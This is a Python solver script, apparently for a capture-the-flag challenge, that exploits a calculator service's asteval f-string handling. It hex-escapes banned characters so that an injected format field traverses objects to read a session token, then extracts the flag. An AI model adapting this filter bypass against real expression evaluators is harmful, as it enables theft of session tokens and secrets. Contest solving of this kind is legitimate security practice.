#!/usr/bin/env python3
"""Exploit SO EZ MISC's vulnerable asteval f-string handling."""

from __future__ import annotations

import argparse
import re
import socket


PROMPT = b"calc> "


def receive_until(connection: socket.socket, marker: bytes) -> bytes:
    data = bytearray()
    while marker not in data:
        chunk = connection.recv(16384)
        if not chunk:
            raise ConnectionError("service closed before returning the prompt")
        data.extend(chunk)
    return bytes(data)


def build_payload() -> str:
    field = "__fstring__.sheets[audit].owner.session.token.value"
    injected_format = "}{" + field

    # The service bans literal underscores and brackets before parsing. Python
    # decodes these escapes while constructing the f-string's format specifier.
    escaped = "".join(
        f"\\x{ord(character):02x}"
        if character in "{}_[]"
        else character
        for character in injected_format
    )
    payload = f'f"{{WB:{escaped}}}"'
    assert "_" not in payload and "[" not in payload and "]" not in payload
    return payload


def exploit(host: str, port: int) -> str:
    payload = build_payload()
    with socket.create_connection((host, port), timeout=10) as connection:
        connection.settimeout(10)
        receive_until(connection, PROMPT)
        connection.sendall(payload.encode() + b"\n")
        response = receive_until(connection, PROMPT).decode(errors="replace")

    match = re.search(r"THJCC\{[^\r\n}]+\}", response)
    if match is None:
        raise RuntimeError(f"flag not found in response: {response!r}")
    return match.group(0)


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("host", nargs="?", default="chal.thjcc.org")
    parser.add_argument("port", nargs="?", type=int, default=9006)
    args = parser.parse_args()

    print(f"payload: {build_payload()}")
    print(f"flag: {exploit(args.host, args.port)}")


if __name__ == "__main__":
    main()
